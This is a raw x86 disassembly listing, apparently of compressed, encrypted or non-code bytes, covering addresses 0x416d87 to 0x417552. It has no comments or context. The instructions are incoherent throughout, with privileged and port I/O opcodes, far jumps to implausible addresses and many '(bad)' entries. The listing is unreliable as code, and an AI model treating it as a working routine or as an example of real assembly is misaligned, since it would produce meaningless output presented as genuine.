  416d87:	xor    cl,ah
  416d89:	out    0x39,eax
  416d8b:	inc    edx
  416d8c:	xor    eax,0x664608c2
  416d91:	test   DWORD PTR ds:0xbf71f30f,esp
  416d97:	xor    eax,0x2cd0b2d5
  416d9c:	push   ss
  416d9d:	pop    edx
  416d9e:	add    BYTE PTR [edx-0x9],ah
  416da1:	mov    es,WORD PTR [ecx+0x5daee9cd]
  416da7:	les    ecx,FWORD PTR [eax+0x45]
  416daa:	icebp  
  416dab:	daa    
  416dac:	adc    BYTE PTR [edi+0x19],bl
  416daf:	jnp    0x416d8a
  416db1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416db2:	sub    BYTE PTR [eax-0x29b8b9b3],bl
  416db8:	lahf   
  416db9:	inc    edx
  416dba:	test   al,0x40
  416dbc:	jno    0x416d85
  416dbe:	add    DWORD PTR [ecx],ebp
  416dc0:	jno    0x416d97
  416dc2:	xchg   edx,eax
  416dc3:	retf   
  416dc4:	mov    ah,0x75
  416dc6:	cmp    eax,0x62631b6
  416dcb:	imul   ebp,DWORD PTR [ebp+0x7a],0xc2f2b61
  416dd2:	cs cld 
  416dd4:	pop    ebx
  416dd5:	jge    0x416de1
  416dd7:	call   0x7a5e:0x2baa1e4c
  416dde:	inc    eax
  416ddf:	ret    
  416de0:	loopne 0x416d71
  416de2:	mov    esi,0xe0a7bee5
  416de7:	inc    eax
  416de8:	nop
  416de9:	gs pop es
  416deb:	repnz or al,0x60
  416dee:	cmp    BYTE PTR [ebp+0x759f38dc],dl
  416df4:	hlt    
  416df5:	ret    0x46ef
  416df8:	jo     0x416e6f
  416dfa:	and    edx,DWORD PTR [edx]
  416dfc:	in     al,dx
  416dfd:	jg     0x416e5c
  416dff:	repnz int 0xbb
  416e02:	jae    0x416da1
  416e04:	sub    ecx,DWORD PTR [ebp+0x2f58c329]
  416e0a:	push   eax
  416e0b:	jmp    0x10b86c1e
  416e10:	rcr    BYTE PTR ds:0x5a802c7,cl
  416e16:	xor    al,0xbf
  416e18:	test   eax,0xd24f4b2b
  416e1d:	adc    ecx,DWORD PTR [ebx-0x4c]
  416e20:	push   0x7b997246
  416e25:	fbstp  TBYTE PTR [ebx+ecx*2+0x30]
  416e29:	or     BYTE PTR [edi-0x1a],0xd4
  416e2d:	int3   
  416e2e:	cwde   
  416e2f:	pop    ebp
  416e30:	je     0x416e1b
  416e32:	loop   0x416e7d
  416e34:	or     cl,cl
  416e36:	in     al,dx
  416e37:	sti    
  416e38:	pop    ds
  416e39:	sub    eax,0x4c22b1bf
  416e3e:	pop    eax
  416e3f:	es mov edi,ecx
  416e42:	ret    0x833f
  416e45:	add    BYTE PTR [edi+eax*4+0x78],ah
  416e49:	jns    0x416e52
  416e4b:	imul   ebp,DWORD PTR [eax],0x16
  416e4e:	ss int 0x72
  416e51:	outs   dx,BYTE PTR ds:[esi]
  416e52:	push   esi
  416e53:	xchg   DWORD PTR [edi+0x29],edi
  416e56:	adc    eax,0x2b33af34
  416e5b:	pop    ebp
  416e5c:	popa   
  416e5d:	cmp    DWORD PTR [edi-0x10],esi
  416e60:	add    ah,BYTE PTR [eax+0x38]
  416e63:	cld    
  416e64:	scas   eax,DWORD PTR es:[edi]
  416e65:	(bad)  
  416e66:	out    dx,eax
  416e67:	mov    al,ds:0x77567000
  416e6c:	sub    eax,0x3585f77b
  416e71:	scas   al,BYTE PTR es:[edi]
  416e72:	daa    
  416e73:	add    esi,DWORD PTR [ebp+0x62]
  416e76:	fild   WORD PTR [ebx-0x23]
  416e79:	inc    ebp
  416e7a:	pop    esp
  416e7b:	push   ebx
  416e7c:	adc    DWORD PTR [ebp+0x5a],ebp
  416e7f:	jne    0x416efc
  416e81:	xchg   edi,ecx
  416e83:	inc    edi
  416e84:	hlt    
  416e85:	cdq    
  416e86:	scas   al,BYTE PTR es:[edi]
  416e87:	arpl   WORD PTR [esi-0x20cc9377],bp
  416e8d:	dec    eax
  416e8e:	jl     0x416e41
  416e90:	iret   
  416e91:	mov    ecx,0xc09df4f7
  416e96:	rol    ecx,0xa2
  416e99:	mov    edi,0xd2830b63
  416e9e:	in     al,dx
  416e9f:	imul   edx,DWORD PTR [eax+0x69eb3a69],0x75c27057
  416ea9:	in     al,dx
  416eaa:	call   0x4419828a
  416eaf:	sub    dh,BYTE PTR [ecx-0x3ba116c5]
  416eb5:	cmp    ebp,DWORD PTR [ebx+0x70]
  416eb8:	fisttp QWORD PTR [ebx-0x651544b3]
  416ebe:	xchg   edi,eax
  416ebf:	dec    esi
  416ec0:	fcom   QWORD PTR [edi]
  416ec2:	or     eax,0x34225c8f
  416ec7:	das    
  416ec8:	sbb    ch,BYTE PTR [eax]
  416eca:	(bad)  
  416ecb:	hlt    
  416ecc:	aas    
  416ecd:	jecxz  0x416f3b
  416ecf:	xchg   edi,eax
  416ed0:	push   edx
  416ed1:	in     al,dx
  416ed2:	sub    bh,bl
  416ed4:	push   ss
  416ed5:	lea    edi,[ebx-0x3fdef16f]
  416edb:	add    DWORD PTR [eax+0x51],edx
  416ede:	(bad)  
  416ee0:	sar    DWORD PTR [ecx],cl
  416ee2:	test   BYTE PTR [edx],0x2a
  416ee5:	dec    ecx
  416ee6:	aam    0xc6
  416ee8:	in     al,0x98
  416eea:	loopne 0x416ea1
  416eec:	xor    eax,esp
  416eee:	jp     0x416f18
  416ef0:	xor    ah,bl
  416ef2:	icebp  
  416ef3:	ins    BYTE PTR es:[edi],dx
  416ef4:	adc    esp,esp
  416ef6:	call   0x3fb4b7e5
  416efb:	sub    esp,DWORD PTR [ebp+0x17c4df0a]
  416f01:	or     DWORD PTR [ecx-0x19],0xffffffb3
  416f05:	mov    ebp,0x83ef0d11
  416f0a:	jae    0x416eb0
  416f0c:	(bad)  
  416f0d:	adc    ah,BYTE PTR [ecx]
  416f0f:	inc    ecx
  416f10:	or     dh,BYTE PTR [ebx-0x29]
  416f13:	mov    eax,esp
  416f15:	nop
  416f16:	add    BYTE PTR [ebx-0x46],0xba
  416f1a:	sub    bh,bh
  416f1c:	(bad)  
  416f1d:	or     al,0x80
  416f1f:	daa    
  416f20:	push   es
  416f21:	jmp    0x21079aaf
  416f26:	or     BYTE PTR [edx],0xc4
  416f29:	stos   DWORD PTR es:[edi],eax
  416f2a:	jl     0x416edf
  416f2c:	fcom   DWORD PTR [ecx]
  416f2e:	inc    ecx
  416f2f:	mov    al,0x67
  416f31:	(bad)  
  416f32:	mov    ecx,0x2121be18
  416f37:	cmc    
  416f38:	push   ecx
  416f39:	add    eax,0xd4a13385
  416f3e:	inc    ebp
  416f3f:	out    0x1d,eax
  416f41:	xchg   BYTE PTR [ebx],ch
  416f43:	mov    al,0xcf
  416f45:	(bad)  [edx+0x6c4975b4]
  416f4b:	push   cs
  416f4c:	xchg   ebp,eax
  416f4d:	dec    ebx
  416f4e:	mov    ebp,0xb558707e
  416f53:	jmp    0x2bf07a95
  416f58:	retf   
  416f59:	add    al,BYTE PTR [edx-0x115a45e4]
  416f5f:	cmp    BYTE PTR [edx],al
  416f61:	pop    ss
  416f62:	cld    
  416f63:	dec    edx
  416f64:	rsm    
  416f66:	mov    esi,DWORD PTR [edi]
  416f68:	jecxz  0x416f58
  416f6a:	sbb    al,0xdc
  416f6c:	xchg   ecx,eax
  416f6d:	adc    BYTE PTR [ecx-0x12],ch
  416f70:	xlat   BYTE PTR ds:[ebx]
  416f71:	das    
  416f72:	mov    eax,ds:0xed513427
  416f77:	mov    ds:0x47ee1455,al
  416f7c:	adc    eax,0x39458fbe
  416f81:	push   0xce033262
  416f86:	ficomp WORD PTR [ebx-0x14e2d9f4]
  416f8c:	ror    dl,0xda
  416f8f:	ins    BYTE PTR es:[edi],dx
  416f90:	inc    esp
  416f91:	jl     0x416f32
  416f93:	pop    ecx
  416f94:	push   ds
  416f95:	mov    ds:0x345825f7,eax
  416f9a:	enter  0x5b37,0x9c
  416f9e:	jp     0x416fbb
  416fa0:	in     eax,0x6d
  416fa2:	xchg   ecx,eax
  416fa3:	xor    DWORD PTR [edx+0x78],0x567e82bf
  416faa:	test   eax,0x695ee858
  416faf:	sbb    eax,0x1587eac4
  416fb4:	adc    eax,0xfc633265
  416fb9:	dec    edx
  416fba:	dec    ecx
  416fbb:	or     BYTE PTR [edx-0xf],ah
  416fbe:	dec    ebp
  416fbf:	mov    dh,0xee
  416fc1:	(bad)  
  416fc2:	aas    
  416fc3:	inc    ecx
  416fc4:	adc    ebp,DWORD PTR [eax-0x129d8a9d]
  416fca:	cld    
  416fcb:	push   esp
  416fcc:	bound  ebx,QWORD PTR [edi+edi*8]
  416fcf:	sub    al,0x98
  416fd1:	scas   al,BYTE PTR es:[edi]
  416fd2:	retf   
  416fd3:	fs nop
  416fd5:	in     al,0xf6
  416fd7:	sub    BYTE PTR ss:[ebx+0xb9e7b10],dh
  416fde:	jo     0x416fb4
  416fe0:	xchg   DWORD PTR [ebp-0xa05c0ab],eax
  416fe6:	outs   dx,BYTE PTR ds:[esi]
  416fe7:	cmp    BYTE PTR [ebp+0x46d4a181],0xeb
  416fee:	sti    
  416fef:	cmp    al,0xd4
  416ff1:	retf   0x784a
  416ff4:	or     BYTE PTR [esi],cl
  416ff6:	adc    al,BYTE PTR ds:0xe5f44839
  416ffc:	mov    edi,DWORD PTR [edx]
  416ffe:	popa   
  416fff:	pop    ebp
  417000:	test   eax,0x890ccc75
  417005:	ds call 0x520c:0x66e21e9e
  41700d:	loope  0x41700a
  41700f:	popa   
  417010:	adc    ch,BYTE PTR [edi]
  417012:	and    esp,DWORD PTR [edx+0x7c]
  417015:	and    ah,al
  417017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417018:	scas   eax,DWORD PTR es:[edi]
  417019:	shl    DWORD PTR [eax-0x3],0xa3
  41701d:	sub    bh,BYTE PTR [esi-0x3749a347]
  417023:	(bad)  
  417024:	mov    ebx,0x3277ea33
  417029:	push   esp
  41702a:	xchg   ebp,eax
  41702b:	(bad)  
  41702c:	les    edx,FWORD PTR [ebx+0x1b]
  41702f:	and    eax,0x50618dce
  417034:	stos   BYTE PTR es:[edi],al
  417035:	js     0x417039
  417037:	js     0x417004
  417039:	or     al,0xaf
  41703b:	xor    eax,0x2fad9d72
  417040:	pop    edx
  417041:	scas   eax,DWORD PTR es:[edi]
  417042:	push   ebx
  417043:	sbb    edx,edx
  417045:	(bad)  
  417046:	mov    dl,0xd0
  417048:	sbb    dh,BYTE PTR [edx+eiz*1]
  41704b:	fisttp DWORD PTR [edx+0x2]
  41704e:	fidiv  DWORD PTR [edx]
  417050:	pop    es
  417051:	repnz out 0xb,al
  417054:	inc    ebx
  417055:	mov    ebp,0x8c2c1b12
  41705a:	jle    0x4170a1
  41705c:	retf   0x847b
  41705f:	sbb    eax,0x934cfea5
  417064:	add    al,0x6b
  417066:	int    0xe7
  417068:	cmp    al,0x30
  41706a:	jmp    0xc43958c2
  41706f:	mov    esp,0x358d3927
  417074:	dec    esp
  417076:	fcom   st(4)
  417078:	cmp    cl,cl
  41707a:	pop    ebx
  41707b:	ja     0x417055
  41707d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41707e:	add    eax,0xdfe4621d
  417083:	add    al,0xb0
  417085:	fmul   DWORD PTR [ebx+esi*4-0x5ad031ae]
  41708c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41708d:	pop    edx
  41708e:	call   0xc90371d0
  417093:	fild   DWORD PTR [eax+ebp*4-0x1e]
  417097:	add    DWORD PTR [ecx],eax
  417099:	test   BYTE PTR [esi+0x6073cad9],dl
  41709f:	jmp    0x43d9642a
  4170a4:	lahf   
  4170a5:	mov    edx,0x9646c2d8
  4170aa:	mov    esp,0xc5be833d
  4170af:	push   ebx
  4170b0:	gs add bl,bh
  4170b3:	dec    ecx
  4170b4:	mov    ah,0xcb
  4170b6:	add    dh,dh
  4170b8:	in     al,dx
  4170b9:	push   esi
  4170ba:	add    BYTE PTR [eax+ebx*4],al
  4170bd:	push   ss
  4170be:	bound  esi,QWORD PTR [edx]
  4170c0:	ret    0xfd4
  4170c3:	adc    BYTE PTR [esi],ch
  4170c5:	pop    ecx
  4170c6:	and    eax,DWORD PTR [esi]
  4170c8:	imul   esi,DWORD PTR [edx],0xfffffffc
  4170cb:	sbb    eax,DWORD PTR [edx-0x5d]
  4170ce:	and    DWORD PTR [ebp+0x7ba1206e],esp
  4170d4:	or     bl,BYTE PTR [edi+0x23aa96fa]
  4170da:	jle    0x417105
  4170dc:	push   es
  4170dd:	ss (bad) 
  4170df:	mov    cl,0xe6
  4170e1:	scas   eax,DWORD PTR es:[edi]
  4170e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170e3:	sbb    BYTE PTR [esi+0x33e4a3b7],dh
  4170e9:	and    dh,BYTE PTR [ecx]
  4170eb:	sub    eax,0xdcae52c7
  4170f0:	inc    ebx
  4170f1:	(bad)  [ebp-0xe393014]
  4170f7:	sub    eax,edi
  4170f9:	adc    BYTE PTR [edi+0x19],al
  4170fc:	nop
  4170fd:	inc    edi
  4170fe:	mov    ebx,0x40d379c1
  417103:	cdq    
  417104:	xchg   cx,ax
  417106:	(bad)  
  417107:	pop    edi
  417108:	out    0xa1,eax
  41710a:	add    ah,BYTE PTR [ebp+0x146cefbe]
  417110:	and    eax,0x7f630a6f
  417115:	repz jae 0x417107
  417118:	fmulp  st(7),st
  41711a:	push   ds
  41711b:	xlat   BYTE PTR ds:[ebx]
  41711c:	and    BYTE PTR [ebx-0x1fe379b3],0xf1
  417123:	mov    eax,0xf9012da4
  417128:	sub    BYTE PTR [ecx],cl
  41712a:	fsubr  QWORD PTR [eax+0x77]
  41712d:	push   ebx
  41712e:	(bad)  
  41712f:	loopne 0x4170f5
  417131:	pop    eax
  417132:	or     eax,ebx
  417134:	(bad)  
  417135:	and    al,0xa1
  417137:	daa    
  417138:	loope  0x4170e4
  41713a:	pop    eax
  41713b:	into   
  41713c:	ss push esp
  41713e:	pop    ecx
  41713f:	push   ds
  417140:	dec    ecx
  417141:	daa    
  417142:	outs   dx,BYTE PTR ds:[esi]
  417143:	pop    edi
  417144:	add    BYTE PTR [ebp-0x3f],0x1
  417148:	xor    al,BYTE PTR [eax+eax*4+0x4e]
  41714c:	fisub  DWORD PTR [ebx+0x5f]
  41714f:	sbb    eax,0x8c5473b8
  417154:	mov    ds:0xccb66b95,eax
  417159:	cs pop edi
  41715b:	repnz or eax,0x427edbca
  417161:	sbb    al,ah
  417163:	and    BYTE PTR ds:0x93e6a658,0xce
  41716a:	stos   BYTE PTR es:[edi],al
  41716b:	and    al,0x6e
  41716d:	adc    al,0x53
  41716f:	jge    0x4171d8
  417171:	fsub   DWORD PTR [eax]
  417173:	lods   al,BYTE PTR ds:[esi]
  417174:	hlt    
  417175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417176:	popa   
  417177:	bt     esp,ebp
  41717a:	shr    BYTE PTR [eax-0x2ade3684],0x16
  417181:	xchg   edi,eax
  417182:	test   dl,cl
  417184:	pop    eax
  417185:	out    dx,al
  417186:	dec    esi
  417187:	xchg   ebx,eax
  417188:	lahf   
  417189:	inc    ebx
  41718a:	jecxz  0x4171ef
  41718c:	inc    esp
  41718d:	mov    ebp,DWORD PTR [eax-0x6545f3a7]
  417193:	stos   DWORD PTR es:[edi],eax
  417194:	data16 repz mov ch,cl
  417198:	shl    ecx,cl
  41719a:	shl    edi,1
  41719c:	xchg   ebx,eax
  41719d:	jae    0x417169
  41719f:	pop    ss
  4171a0:	xchg   edx,eax
  4171a1:	mov    eax,0xac327f10
  4171a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171a7:	jmp    0xab3cbe93
  4171ac:	imul   DWORD PTR [ebx+ecx*1+0x3]
  4171b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171b1:	bnd jb 0x41718d
  4171b4:	jb     0x4171c7
  4171b6:	jo     0x41721b
  4171b8:	loope  0x417223
  4171ba:	add    ebp,esi
  4171bc:	pop    ds
  4171bd:	aas    
  4171be:	fistp  QWORD PTR [esi-0x43]
  4171c1:	lods   al,BYTE PTR ds:[esi]
  4171c2:	mov    ebp,0x8c91de04
  4171c7:	mov    ebx,0x17ec09da
  4171cc:	sar    esp,cl
  4171ce:	adc    dl,BYTE PTR [esi+0x20]
  4171d1:	jle    0x417188
  4171d3:	out    dx,eax
  4171d4:	loop   0x4171de
  4171d6:	push   esi
  4171d7:	fimul  DWORD PTR [edi-0x444002ff]
  4171dd:	add    al,0x75
  4171df:	mov    edx,0x4498decf
  4171e4:	cli    
  4171e5:	fwait
  4171e6:	stos   DWORD PTR es:[edi],eax
  4171e7:	xchg   esi,eax
  4171e8:	pusha  
  4171e9:	ja     0x4171fd
  4171eb:	push   0x528a7e33
  4171f0:	mov    ecx,DWORD PTR [eax]
  4171f2:	aad    0x94
  4171f4:	into   
  4171f5:	jl     0x4171a1
  4171f7:	sbb    eax,0xa19a6969
  4171fc:	sub    al,0x47
  4171fe:	mov    ds:0x7bf1ad6b,al
  417203:	call   0x88a6ff88
  417208:	ret    
  417209:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41720a:	push   ebx
  41720b:	pop    esi
  41720c:	mov    ebp,esp
  41720e:	xor    al,0xb0
  417210:	pop    edi
  417211:	mov    cl,0xea
  417213:	sub    DWORD PTR [ecx+0x694f91c8],esi
  417219:	(bad)  
  41721a:	loopne 0x4171f7
  41721c:	mov    ds:0x50de471b,al
  417221:	push   ecx
  417222:	adc    DWORD PTR [esi],0xcae09d2c
  417228:	sub    al,0x45
  41722a:	xor    al,0x5c
  41722c:	mov    bh,BYTE PTR [ebx]
  41722e:	or     BYTE PTR [ebx-0x330c60e3],ah
  417234:	adc    al,0x72
  417236:	jo     0x41727f
  417238:	sar    BYTE PTR [edx],cl
  41723a:	xchg   ecx,eax
  41723b:	push   eax
  41723c:	retf   0x52ab
  41723f:	(bad)  
  417241:	out    0x6e,eax
  417243:	out    0x29,eax
  417245:	jno    0x417234
  417247:	repnz out 0xb9,eax
  41724a:	xchg   esi,eax
  41724b:	ja     0x417203
  41724d:	xor    al,0xb8
  41724f:	sub    eax,0x6a2856da
  417254:	sbb    BYTE PTR [esi+0x3ded3adb],dh
  41725a:	sbb    eax,0xd843a9b2
  41725f:	popf   
  417260:	into   
  417261:	test   eax,0xd2618f76
  417266:	pop    ebp
  417267:	mov    BYTE PTR [eax+edi*1-0x62],bl
  41726b:	jge    0x4172c1
  41726d:	xor    edx,DWORD PTR [ecx+0x3fa8ad5c]
  417273:	xchg   esp,eax
  417274:	cmp    eax,0x24add379
  417279:	ret    
  41727a:	aad    0x4f
  41727c:	aam    0xd4
  41727e:	leave  
  41727f:	and    edi,edi
  417281:	cmp    bh,cl
  417283:	xor    al,0x74
  417285:	adc    esp,DWORD PTR [ecx+eiz*4]
  417288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417289:	lea    ebx,[ebx]
  41728b:	cdq    
  41728c:	mov    ds:0x1f57c3ba,al
  417291:	mul    DWORD PTR [ebx-0x3e]
  417294:	sbb    DWORD PTR [esi-0x5a],ebx
  417297:	lods   al,BYTE PTR ds:[esi]
  417298:	mov    al,0xf1
  41729a:	sub    eax,0xdbe1edb7
  41729f:	mov    bh,0x94
  4172a1:	mov    ebp,0x2e6aeac8
  4172a6:	inc    ecx
  4172a7:	out    0x93,eax
  4172a9:	clc    
  4172aa:	inc    esp
  4172ab:	mov    ah,BYTE PTR [esi-0x4ff8af17]
  4172b1:	call   0x2340cd94
  4172b6:	ror    al,cl
  4172b8:	in     al,0x18
  4172ba:	(bad)  
  4172bb:	div    BYTE PTR [ebx+0x5dd1aeab]
  4172c1:	cld    
  4172c2:	push   ebx
  4172c3:	prefetcht1 BYTE PTR [esi-0x4897fec7]
  4172ca:	mov    ebp,0xff895538
  4172cf:	stos   DWORD PTR es:[edi],eax
  4172d0:	or     al,0x0
  4172d2:	ror    DWORD PTR [edx],1
  4172d4:	pop    ss
  4172d5:	(bad)  
  4172d6:	enter  0x11a2,0x5b
  4172da:	mov    ecx,DWORD PTR [edx]
  4172dc:	sbb    BYTE PTR [ecx-0x14],bh
  4172df:	xchg   ebp,eax
  4172e0:	jbe    0x4172e6
  4172e2:	ins    DWORD PTR es:[edi],dx
  4172e3:	sub    dl,BYTE PTR [eax+edx*1]
  4172e6:	call   0xb7db:0xe2cb7d4f
  4172ed:	and    al,0x13
  4172ef:	fdiv   QWORD PTR [eax-0x78]
  4172f2:	pusha  
  4172f3:	hlt    
  4172f4:	mov    dl,0x9c
  4172f6:	lods   al,BYTE PTR ds:[esi]
  4172f7:	aam    0x13
  4172f9:	dec    edx
  4172fa:	ret    0xe3bd
  4172fd:	sbb    bl,bh
  4172ff:	lock xchg ebx,eax
  417301:	(bad)  
  417302:	int3   
  417303:	push   es
  417304:	neg    ch
  417306:	iret   
  417307:	add    BYTE PTR [edx+0x5e],ch
  41730a:	jg     0x417366
  41730c:	test   eax,0x84338814
  417311:	xchg   edi,eax
  417312:	lods   al,BYTE PTR ds:[esi]
  417313:	cdq    
  417314:	rcl    BYTE PTR [esi-0x16],0xd9
  417318:	into   
  417319:	xor    al,BYTE PTR [edx+0x35]
  41731c:	dec    edx
  41731d:	jl     0x417395
  41731f:	adc    bh,0xcc
  417322:	dec    ebx
  417323:	shl    BYTE PTR [eax+0x6145fe53],cl
  417329:	rol    DWORD PTR [ecx+0x74479eb5],0x51
  417330:	cli    
  417331:	cli    
  417332:	lock out 0x76,eax
  417335:	js     0x41734b
  417337:	(bad)  
  417338:	xchg   edi,eax
  417339:	sbb    esp,DWORD PTR [eax+0x1eeb3c29]
  41733f:	add    eax,0x6d73fb99
  417344:	popa   
  417345:	push   esp
  417346:	xchg   esp,eax
  417347:	leave  
  417348:	(bad)  
  417349:	in     eax,0x7a
  41734b:	repnz repz adc BYTE PTR [eax+0x76ab26c7],dl
  417353:	loope  0x417318
  417355:	jns    0x417368
  417357:	cdq    
  417358:	stos   DWORD PTR es:[edi],eax
  417359:	dec    eax
  41735a:	into   
  41735b:	or     eax,0xd8cdf95b
  417360:	cwde   
  417361:	sbb    edx,ecx
  417363:	imul   esp,DWORD PTR [edi+0x3],0xffffffd1
  417367:	mov    ds:0xa721b669,al
  41736c:	arpl   WORD PTR [eax],ax
  41736e:	mov    ch,0xe6
  417370:	jl     0x417325
  417372:	adc    eax,0xbd08f042
  417377:	add    edx,DWORD PTR [ebx+0xb]
  41737a:	and    ah,BYTE PTR [edx]
  41737c:	test   eax,0xcb014759
  417381:	jmp    0x41733b
  417383:	jns    0x417332
  417385:	push   ss
  417386:	sbb    BYTE PTR [eax],bh
  417388:	pop    edx
  417389:	popa   
  41738a:	xchg   esi,eax
  41738b:	mov    edi,0x24485da6
  417390:	out    dx,eax
  417391:	xor    al,BYTE PTR [edx]
  417393:	add    BYTE PTR [edx+ebx*2+0x24f4dc73],bl
  41739a:	mov    al,0xa5
  41739c:	lds    esp,FWORD PTR [ecx+0x4d]
  41739f:	sahf   
  4173a0:	mov    ds:0x15baf853,eax
  4173a5:	int    0xb9
  4173a7:	or     ebx,DWORD PTR [ebx+0x1c64a6c1]
  4173ad:	js     0x417367
  4173af:	repnz mov ds:0x94a1d7c1,eax
  4173b5:	nop
  4173b6:	and    BYTE PTR [edx-0x2f],dl
  4173b9:	pop    ebp
  4173ba:	or     dh,cl
  4173bc:	arpl   WORD PTR [edx],bp
  4173be:	(bad)  
  4173bf:	sbb    ebx,eax
  4173c1:	repz ror BYTE PTR [eax+0x464c620f],cl
  4173c8:	retf   0x2d99
  4173cb:	mov    al,fs:0xd107c382
  4173d1:	loope  0x41741b
  4173d3:	or     BYTE PTR [edx],bl
  4173d5:	call   FWORD PTR [esi]
  4173d7:	lods   al,BYTE PTR ds:[esi]
  4173d8:	not    BYTE PTR [ebx+0x45]
  4173db:	mov    ch,0xbb
  4173dd:	imul   ebp,DWORD PTR [esi],0x13
  4173e0:	pop    esi
  4173e1:	mov    al,ds:0x3c897783
  4173e6:	mov    eax,0x1843bbed
  4173eb:	pop    ds
  4173ec:	or     ah,0x94
  4173ef:	push   cs
  4173f0:	push   ds
  4173f1:	rcl    BYTE PTR [eax+0x3a],1
  4173f4:	daa    
  4173f5:	fdivrp st(2),st
  4173f7:	push   DWORD PTR [edx-0x4b]
  4173fa:	pop    esi
  4173fb:	inc    ebx
  4173fc:	or     al,0xa0
  4173fe:	es or  eax,0xef00cddd
  417404:	dec    ebp
  417405:	es mov ebp,0xa198f9
  41740b:	jb     0x4173e5
  41740d:	(bad)  
  41740f:	xchg   DWORD PTR [edx+ecx*8],eax
  417412:	pop    ss
  417413:	pusha  
  417414:	mov    ds:0x22a0ff8f,eax
  417419:	and    BYTE PTR [eax],0x6b
  41741c:	push   eax
  41741d:	dec    esi
  41741e:	cld    
  41741f:	push   ebx
  417420:	jne    0x4173a3
  417422:	outs   dx,BYTE PTR ds:[esi]
  417423:	xor    ch,cl
  417425:	pop    esi
  417426:	adc    ebx,DWORD PTR [edi-0x59]
  417429:	int3   
  41742a:	xor    esp,ecx
  41742c:	lahf   
  41742d:	push   ecx
  41742e:	inc    eax
  41742f:	fsubp  st(1),st
  417431:	and    ecx,edx
  417433:	add    eax,0xefca8eae
  417438:	mov    edx,0x32ce97f2
  41743d:	fbstp  TBYTE PTR [ecx]
  41743f:	xchg   esi,eax
  417440:	popf   
  417441:	fwait
  417442:	pop    esp
  417443:	adc    BYTE PTR [edx+0x28],bh
  417446:	(bad)  
  417447:	push   eax
  417448:	sbb    eax,0xce078831
  41744d:	ss loope 0x4173f7
  417450:	sbb    eax,0x5c22536a
  417455:	ror    edi,1
  417457:	push   ebx
  417458:	ins    BYTE PTR es:[edi],dx
  417459:	iret   
  41745a:	mov    edi,0x4e2b83b9
  41745f:	into   
  417460:	sbb    esi,DWORD PTR [edx-0x3d]
  417463:	add    ah,dl
  417465:	neg    DWORD PTR [esp+edx*8]
  417468:	mov    ebx,0xceef1ebc
  41746d:	ror    BYTE PTR [eax+0x7f],1
  417470:	push   0x77630c1f
  417475:	and    eax,DWORD PTR [edi-0x11]
  417478:	pop    ds
  417479:	aaa    
  41747a:	and    al,0x5f
  41747c:	aam    0x50
  41747e:	test   DWORD PTR [esi],ebx
  417480:	fldenv [edi]
  417482:	xchg   esp,eax
  417483:	std    
  417484:	pop    eax
  417485:	test   edx,ebx
  417487:	mov    ecx,0x2258722f
  41748c:	not    DWORD PTR [ebp+0x7745b8c5]
  417492:	and    BYTE PTR [ecx+0x6db7d10f],ah
  417498:	mov    ebp,?
  41749a:	dec    ebp
  41749b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41749d:	jp     0x41745b
  41749f:	jmp    0x417472
  4174a1:	scas   al,BYTE PTR es:[edi]
  4174a2:	sub    cl,0xe8
  4174a5:	lahf   
  4174a6:	jno    0x4174aa
  4174a8:	jp     0x41751b
  4174aa:	rcl    ebx,1
  4174ac:	cli    
  4174ad:	loop   0x41745d
  4174af:	int    0xad
  4174b1:	imul   edi,ebp,0xffffffea
  4174b4:	out    0x3b,eax
  4174b6:	mov    dl,0x54
  4174b8:	call   0xb470fff6
  4174bd:	push   esi
  4174be:	mov    BYTE PTR [ebx],0x43
  4174c1:	test   al,0xef
  4174c3:	int    0x54
  4174c5:	(bad)  
  4174c6:	push   ecx
  4174c7:	cmc    
  4174c8:	imul   BYTE PTR [esi]
  4174ca:	scas   al,BYTE PTR es:[edi]
  4174cb:	inc    ebx
  4174cc:	ret    
  4174cd:	(bad)  
  4174ce:	xor    BYTE PTR ds:0x57fcfc2b,bh
  4174d4:	bound  ebx,QWORD PTR [ecx]
  4174d6:	pop    esi
  4174d7:	in     al,dx
  4174d8:	leave  
  4174d9:	hlt    
  4174da:	into   
  4174db:	add    al,0x61
  4174dd:	mov    edi,0x53546537
  4174e2:	fsub   QWORD PTR [edi+0x4b]
  4174e5:	mov    dl,0x49
  4174e7:	aad    0x59
  4174e9:	pop    eax
  4174ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174eb:	(bad)  
  4174ec:	push   esi
  4174ed:	jge    0x417529
  4174ef:	xchg   DWORD PTR [edx+0x43],ebx
  4174f2:	iret   
  4174f3:	cmc    
  4174f4:	push   esi
  4174f5:	sbb    eax,0xbd30018a
  4174fa:	mov    esi,0x2bc5c16c
  4174ff:	test   eax,0xa5279bca
  417504:	lods   al,BYTE PTR ds:[esi]
  417505:	dec    ebp
  417506:	dec    esi
  417507:	xchg   dl,bh
  417509:	xor    eax,0x5e7ea5b2
  41750e:	sub    DWORD PTR [esi],esp
  417510:	sbb    al,0xd7
  417512:	jp     0x4174c6
  417514:	sub    BYTE PTR [ecx],bh
  417516:	out    0x89,al
  417518:	xchg   ebp,eax
  417519:	push   esi
  41751a:	inc    DWORD PTR [eax-0x659d7e89]
  417520:	adc    BYTE PTR [esi+ebx*8],0x59
  417524:	pushf  
  417525:	pop    ebx
  417526:	pop    ss
  417527:	sub    al,0xf2
  417529:	rcl    edx,0xb7
  41752c:	bound  ebp,QWORD PTR [eax-0x39cd6cef]
  417532:	xchg   ebp,eax
  417533:	lahf   
  417534:	push   eax
  417535:	dec    esi
  417536:	nop
  417537:	daa    
  417538:	cs jae 0x4174bd
  41753b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41753c:	and    DWORD PTR [edi+eiz*8-0x40],esp
  417540:	aad    0x3c
  417542:	aam    0x25
  417544:	shr    BYTE PTR [ebp-0x5e],0x58
  417548:	mov    gs,eax
  41754a:	mov    edi,esp
  41754c:	sub    edi,DWORD PTR [eax+0x1c63af97]
  417552:	cdq    
